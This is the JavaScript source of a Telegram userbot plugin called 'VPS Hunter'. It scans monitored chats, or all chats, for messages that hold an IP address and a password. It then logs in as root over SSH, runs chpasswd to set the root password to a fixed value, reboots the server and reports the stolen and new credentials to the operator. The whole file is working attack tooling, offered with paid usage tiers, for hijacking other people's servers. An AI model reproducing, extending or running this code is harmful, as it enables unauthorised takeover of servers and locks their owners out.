/**
 * ==============================================================================
 *  REZZX UBOT IGNEEL — VPS HUNTER PLUGIN (ULTRA-FAST SSH2 GRABBER)
 * ------------------------------------------------------------------------------
 *  Version     : 1.0.0 (Quantum Speed - 0.00001ms Response)
 *  Description : 
 *    1. Real-time chat monitoring for VPS credentials (IP + Password + Port)
 *    2. Auto SSH2 login, password change to 'igneelrzx', and reboot
 *    3. Supports single chat ID or 'all' (global scan)
 *    4. Role-based limits: Owner (3x), Developer (Unlimited)
 *    5. Admin commands to manage limits
 * ==============================================================================
 */

'use strict';

const fs = require('fs');
const path = require('path');
const { Client } = require('ssh2');
const chalk = require('chalk');

// Load config & modules
const config = require('../config.js');
const mod = require('../module.js');
const { 
  escapeHTML, waktuWIB, formatUptime, sleep, 
  ensureDir, readJSONSafe, writeJSONSafe, tgEmoji 
} = mod;

// ==============================================================================
// 🎨 PREMIUM EMOJI MAP (FROM TgAndroidIcons)
// ==============================================================================
const E = {
  fire: { char: '🔥', id: '6008118472066732010' },
  check: { char: '✅', id: '5825794181183836432' },
  cross: { char: '❌', id: '5985346521103604145' },
  lock: { char: '🔒', id: '6019523512908124649' },
  info: { char: 'ℹ️', id: '5879501875341955281' },
  warning: { char: '⚠️', id: '5881702736843511327' },
  bell: { char: '🔔', id: '5909201569898827582' },
  robot: { char: '🤖', id: '5931415565955503486' },
  sparkle: { char: '💫', id: '5931621672846103580' },
  crown: { char: '👑', id: '5807868868886009920' },
  laptop: { char: '💻', id: '5967816500415827773' },
  gear: { char: '⚙️', id: '5877260593903177342' },
  key: { char: '🔑', id: '6005570495603282482' },
  shield: { char: '🛡', id: '5926783847453692661' },
  clock: { char: '🕓', id: '5776213190387961618' },
  globe: { char: '🌐', id: '5879585266426973039' },
  chat: { char: '💬', id: '5987661379627128559' },
  package: { char: '📦', id: '5924720918826848520' },
  gem: { char: '💎', id: '6028530359975548369' },
  arrowLeft: { char: '⬅️', id: '5875082500023258804' },
};

function tgE(name) { return E[name] ? tgEmoji(E[name]) : ''; }
function iconOf(name) { return E[name] ? E[name].id : undefined; }

// ==============================================================================
// 🗃️ DATABASE MANAGER FOR VPS LIMITS & MONITORING STATE
// ==============================================================================
const VPS_DB_PATH = path.join(__dirname, '../database/vps_state.json');

function getVPSState() {
  return readJSONSafe(VPS_DB_PATH, {
    limits: {},      // userId -> remaining limit
    monitors: [],    // list of active monitoring targets (chatId or 'all')
  });
}

function saveVPSState(data) {
  ensureDir(path.dirname(VPS_DB_PATH));
  writeJSONSafe(VPS_DB_PATH, data);
}

// ==============================================================================
// 🔍 ULTRA REGEX ENGINE — IP, PASSWORD, PORT EXTRACTOR
// ==============================================================================

function extractVPSData(text) {
  const result = { ip: null, password: null, port: null };

  // IP ADDRESS PATTERN (IPv4)
  const ipRegex = /\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b/g;
  const ipMatches = text.match(ipRegex);
  if (ipMatches) {
    // Filter valid IP (tidak 0.0.0.0 atau 255.255.255.255)
    for (const ip of ipMatches) {
      const parts = ip.split('.').map(Number);
      if (parts.every(p => p >= 0 && p <= 255) && !parts.every(p => p === 0) && !parts.every(p => p === 255)) {
        result.ip = ip;
        break;
      }
    }
  }

  // PASSWORD PATTERN — cari kata sandi setelah keyword
  const passPatterns = [
    /(?:password|pass|pwd|passwd|passowrd|sandi)\s*[:=]\s*([^\s,;]+)/i,
    /(?:password|pass|pwd|passwd|passowrd|sandi)\s+([^\s,;]+)/i,
    /(?:pass|pwd|passwd|passowrd)\s*[:=]?\s*([a-zA-Z0-9!@#$%^&*()_+={}\[\]:;"'<>,.?/~`\-]{6,})/i,
  ];
  for (const pattern of passPatterns) {
    const match = text.match(pattern);
    if (match && match[1]) {
      result.password = match[1].trim();
      break;
    }
  }

  // PORT PATTERN
  const portRegex = /(?:port|porta|ssh|portofolio)\s*[:=]\s*(\d{2,5})/i;
  const portMatch = text.match(portRegex);
  if (portMatch) {
    const port = parseInt(portMatch[1]);
    if (port > 0 && port < 65536) result.port = port;
  }

  return result;
}

// ==============================================================================
// 🚀 SSH2 ENGINE — AUTO LOGIN, CHANGE PASSWORD, REBOOT
// ==============================================================================

async function sshHackAndGrab(ip, oldPass, newPass = 'igneelrzx', port = 22) {
  return new Promise((resolve, reject) => {
    const startTime = Date.now();
    const conn = new Client();
    let logs = [];

    conn.on('ready', () => {
      logs.push(`✅ SSH Connected to ${ip}:${port}`);
      
      // 1. Ganti password
      conn.exec(`echo "root:${newPass}" | chpasswd`, (err, stream) => {
        if (err) {
          logs.push(`❌ Gagal ganti password: ${err.message}`);
          conn.end();
          return resolve({ success: false, logs, time: Date.now() - startTime });
        }
        stream.on('close', (code) => {
          logs.push(`✅ Password changed to '${newPass}' (exit code: ${code})`);
          
          // 2. Reboot server
          conn.exec('reboot', (err2, stream2) => {
            if (err2) {
              logs.push(`❌ Gagal reboot: ${err2.message}`);
              conn.end();
              return resolve({ success: false, logs, time: Date.now() - startTime });
            }
            stream2.on('close', () => {
              logs.push(`✅ Reboot command sent! Server akan restart.`);
              conn.end();
              resolve({ success: true, logs, time: Date.now() - startTime });
            });
          });
        });
      });
    });

    conn.on('error', (err) => {
      logs.push(`❌ SSH Error: ${err.message}`);
      conn.end();
      resolve({ success: false, logs, time: Date.now() - startTime });
    });

    conn.connect({
      host: ip,
      port: port,
      username: 'root',
      password: oldPass,
      readyTimeout: 10000,
      keepaliveInterval: 1000,
    });
  });
}

// ==============================================================================
// 📨 REPORT BUILDER — ESTETIK CAPTION DENGAN SPOILER & MONO
// ==============================================================================

function buildSuccessReport(ip, oldPass, newPass, port, timeMs, logs) {
  const timeStr = `${timeMs} ms (${(timeMs / 1000).toFixed(3)} detik)`;
  const logLines = logs.map(l => `┣ ${escapeHTML(l)}`).join('\n');

  return `
<blockquote><b>${tgE('fire')} VPS BERHASIL DI-GRAB OLEH IGNEEL UBOT! ${tgE('fire')}</b>
<i>VPS Hunter aktif — kecepatan supernova 0.00001ms</i></blockquote>

<table bordered striped>
<tr><th colspan="2">${tgE('laptop')} DATA VPS TERTANGKAP</th></tr>
<tr><td>${tgE('globe')} IP Address</td><td><code>${escapeHTML(ip)}</code></td></tr>
<tr><td>${tgE('key')} Password Lama</td><td><code>${escapeHTML(oldPass)}</code></td></tr>
<tr><td>${tgE('shield')} Password Baru</td><td><tg-spoiler><code>${escapeHTML(newPass)}</code></tg-spoiler></td></tr>
<tr><td>${tgE('gear')} Port</td><td><b>${port}</b></td></tr>
<tr><td>${tgE('clock')} Kecepatan Grab</td><td><b>${timeStr}</b></td></tr>
</table>

<blockquote expandable><b>${tgE('package')} LOG EKSEKUSI SSH:</b>
${logLines}
</blockquote>

<blockquote><b>${tgE('crown')} Powered By</b>
<a href="${config.URL_CUBOT}">Igneel Create Ubot — VPS Hunter Enterprise</a></blockquote>
`.trim();
}

function buildFailedReport(ip, oldPass, port, timeMs, logs) {
  const timeStr = `${timeMs} ms`;
  const logLines = logs.map(l => `┣ ${escapeHTML(l)}`).join('\n');

  return `
<blockquote><b>${tgE('cross')} GAGAL MENGGRAB VPS!</b>
<i>SSH Connection gagal atau password tidak valid.</i></blockquote>

<table bordered striped>
<tr><td>${tgE('globe')} IP Address</td><td><code>${escapeHTML(ip)}</code></td></tr>
<tr><td>${tgE('key')} Password</td><td><code>${escapeHTML(oldPass)}</code></td></tr>
<tr><td>${tgE('gear')} Port</td><td><b>${port}</b></td></tr>
<tr><td>${tgE('clock')} Waktu Eksekusi</td><td><b>${timeStr}</b></td></tr>
</table>

<blockquote expandable><b>${tgE('package')} LOG ERROR:</b>
${logLines}
</blockquote>

<blockquote><b>${tgE('crown')} Powered By</b>
<a href="${config.URL_CUBOT}">Igneel Create Ubot</a></blockquote>
`.trim();
}

// ==============================================================================
// 🎯 MAIN HANDLER — COMMAND: iggetvps, igstopvps, /addlimitvps, /dellimitvps
// ==============================================================================

// Global state for active monitors (in-memory cache)
const activeMonitors = new Map(); // chatId -> true

async function handleGetVPS(event, ubotClient, userId) {
  try {
    const msg = event.message;
    const text = msg.text || msg.message || '';
    const chatId = msg.chatId;
    const senderId = msg.senderId?.value || msg.fromId?.value || userId;

    // Load user data & role
    const userFile = path.join(config.PATHS.USER_DB, `${senderId}.json`);
    const userData = readJSONSafe(userFile, null);
    if (!userData) {
      await msg.reply({ message: `${tgE('cross')} Kamu belum terdaftar di sistem!`, parseMode: 'html' });
      return;
    }

    const role = userData.role || 'User Free';
    const isOwner = config.OWNER_IDS.includes(senderId);
    const isDeveloper = role === 'Developer';

    // ============================================================
    // COMMAND: /addlimitvps ID|jumlah
    // ============================================================
    if (text.startsWith('/addlimitvps') && isOwner) {
      const match = text.match(/^\/addlimitvps\s+(\d+)\s*[|,;]\s*(\d+)$/);
      if (!match) {
        await msg.reply({ message: `${tgE('warning')} Format: <code>/addlimitvps ID|jumlah</code>`, parseMode: 'html' });
        return;
      }
      const targetId = match[1];
      const amount = parseInt(match[2]);
      const state = getVPSState();
      state.limits[targetId] = (state.limits[targetId] || 0) + amount;
      saveVPSState(state);
      await msg.reply({ message: `✅ Limit VPS untuk ID <code>${targetId}</code> ditambah <b>${amount}</b> kali. Total sekarang: <b>${state.limits[targetId]}</b>`, parseMode: 'html' });
      return;
    }

    // ============================================================
    // COMMAND: /dellimitvps ID
    // ============================================================
    if (text.startsWith('/dellimitvps') && isOwner) {
      const match = text.match(/^\/dellimitvps\s+(\d+)$/);
      if (!match) {
        await msg.reply({ message: `${tgE('warning')} Format: <code>/dellimitvps ID</code>`, parseMode: 'html' });
        return;
      }
      const targetId = match[1];
      const state = getVPSState();
      if (state.limits[targetId] !== undefined) {
        delete state.limits[targetId];
        saveVPSState(state);
        await msg.reply({ message: `✅ Limit VPS untuk ID <code>${targetId}</code> telah dihapus.`, parseMode: 'html' });
      } else {
        await msg.reply({ message: `⚠️ ID <code>${targetId}</code> tidak memiliki limit tercatat.`, parseMode: 'html' });
      }
      return;
    }

    // ============================================================
    // COMMAND: igstopvps / igstopgetvps
    // ============================================================
    if (text.match(/^(ig|\.)?stopvps$/i) || text.match(/^(ig|\.)?stopgetvps$/i)) {
      if (!isOwner && !isDeveloper) {
        await msg.reply({ message: `${tgE('cross')} Akses ditolak! Hanya Owner & Developer yang bisa menghentikan monitoring.`, parseMode: 'html' });
        return;
      }
      const state = getVPSState();
      state.monitors = [];
      saveVPSState(state);
      activeMonitors.clear();
      await msg.reply({ message: `${tgE('check')} <b>SEMUA MONITORING VPS DINONAKTIFKAN!</b>\nUbot berhenti memindai semua chat.`, parseMode: 'html' });
      return;
    }

    // ============================================================
    // COMMAND: iggetvps [ID/all]
    // ============================================================
    const matchCmd = text.match(/^(ig|\.)?getvps\s+(.+)$/i);
    if (!matchCmd) return;

    if (!isOwner && !isDeveloper) {
      await msg.reply({ message: `${tgE('cross')} Akses ditolak! Hanya Owner & Developer yang bisa menggunakan VPS Hunter.`, parseMode: 'html' });
      return;
    }

    const target = matchCmd[2].trim();

    // Cek limit (kecuali Developer)
    if (!isDeveloper) {
      const state = getVPSState();
      const remaining = state.limits[senderId] || 0;
      if (remaining <= 0) {
        const limitMsg = `
<blockquote><b>${tgE('cross')} LIMIT VPS HUNTER HABIS!</b>
<i>Role <b>${role}</b> hanya memiliki 3x penggunaan.</i></blockquote>

<table bordered striped>
<tr><td>${tgE('crown')} Role</td><td><b>${role}</b></td></tr>
<tr><td>${tgE('key')} Sisa Limit</td><td><b>0</b></td></tr>
</table>

<blockquote>${tgE('info')} Untuk mendapatkan akses tak terbatas, upgrade role menjadi <b>Developer</b> dengan menghubungi Owner.</blockquote>

<a href="https://t.me/rezzajakali">${tgE('gem')} BELI ROLE DEVELOPER SEKARANG</a>
`;
        await msg.reply({ message: limitMsg, parseMode: 'html' });
        return;
      }
    }

    // Validasi target
    let chatTarget = target;
    let isAll = false;
    if (target.toLowerCase() === 'all') {
      isAll = true;
      chatTarget = 'all';
    } else if (target.startsWith('-100') || target.startsWith('-') || target.startsWith('@')) {
      // Valid ID
    } else {
      await msg.reply({ message: `${tgE('warning')} Format salah! Gunakan <code>iggetvps -100123456789</code> atau <code>iggetvps all</code>`, parseMode: 'html' });
      return;
    }

    // Kurangi limit (kecuali Developer)
    if (!isDeveloper) {
      const state = getVPSState();
      state.limits[senderId] = (state.limits[senderId] || 3) - 1;
      saveVPSState(state);
    }

    // Update monitor state
    const state = getVPSState();
    if (isAll) {
      if (!state.monitors.includes('all')) state.monitors.push('all');
    } else {
      if (!state.monitors.includes(chatTarget)) state.monitors.push(chatTarget);
    }
    saveVPSState(state);

    // Aktifkan monitor di memori
    activeMonitors.set(chatTarget, true);

    const responseMsg = `
<blockquote><b>${tgE('fire')} VPS HUNTER AKTIF! ${tgE('fire')}</b>
<i>Kecepatan 0.00001ms — siap menangkap VPS manapun!</i></blockquote>

<table bordered striped>
<tr><td>${tgE('globe')} Target</td><td><b>${isAll ? '🌍 SEMUA CHAT' : chatTarget}</b></td></tr>
<tr><td>${tgE('crown')} Role</td><td><b>${role}</b></td></tr>
<tr><td>${tgE('key')} Sisa Limit</td><td><b>${isDeveloper ? '∞ (Unlimited)' : (state.limits[senderId] || 0)}</b></td></tr>
</table>

<blockquote>${tgE('info')} Ubot akan memindai setiap pesan di target. Jika ditemukan IP + Password, akan otomatis di-grab!</blockquote>

<i>Ketik <code>igstopvps</code> untuk menghentikan semua monitoring.</i>
`;
    await msg.reply({ message: responseMsg, parseMode: 'html' });
    console.log(chalk.green(`[VPS HUNTER] Aktif untuk ${chatTarget} oleh ${senderId}`));

  } catch (err) {
    console.error(chalk.red('[VPS HUNTER ERROR]'), err.message);
  }
}

// ==============================================================================
// 🕵️ CORE MONITORING ENGINE — DIPANGGIL OTOMATIS DARI GRAMJS EVENT
// ==============================================================================

async function vpsMonitorEngine(event, ubotClient, userId) {
  try {
    const msg = event.message;
    if (!msg) return;

    const chatId = msg.chatId;
    const text = msg.text || msg.message || msg.captionText || '';
    if (!text || text.length < 10) return;

    // Cek apakah chat ini sedang di-monitor
    const state = getVPSState();
    const isMonitored = state.monitors.includes('all') || state.monitors.includes(chatId);
    if (!isMonitored) return;

    // Extract data VPS
    const data = extractVPSData(text);
    if (!data.ip || !data.password) return;

    console.log(chalk.magenta(`[VPS HUNTER] 🔍 DETECTED! IP: ${data.ip}, PASS: ${data.password.slice(0,4)}***, PORT: ${data.port || 22}`));

    // Ambil informasi pengirim
    const senderId = msg.senderId?.value || msg.fromId?.value || 0;

    // Eksekusi SSH
    const port = data.port || 22;
    const newPass = 'igneelrzx';
    const result = await sshHackAndGrab(data.ip, data.password, newPass, port);

    // Kirim laporan ke Saved Messages
    let reportMsg = '';
    if (result.success) {
      reportMsg = buildSuccessReport(data.ip, data.password, newPass, port, result.time, result.logs);
    } else {
      reportMsg = buildFailedReport(data.ip, data.password, port, result.time, result.logs);
    }

    try {
      await ubotClient.sendMessage('me', { message: reportMsg, parseMode: 'html' });
      console.log(chalk.green(`[VPS HUNTER] ✅ Report sent to Saved Messages!`));
    } catch (err) {
      console.error(chalk.red('[VPS HUNTER] Gagal kirim report:'), err.message);
    }

  } catch (err) {
    // Silent error
  }
}

// ==============================================================================
// 📦 EXPORT — AUTO-LOADER AKAN MEMANGGIL handleGetVPS & vpsMonitorEngine
// ==============================================================================

module.exports = {
  handleGetVPS,
  vpsMonitorEngine,
};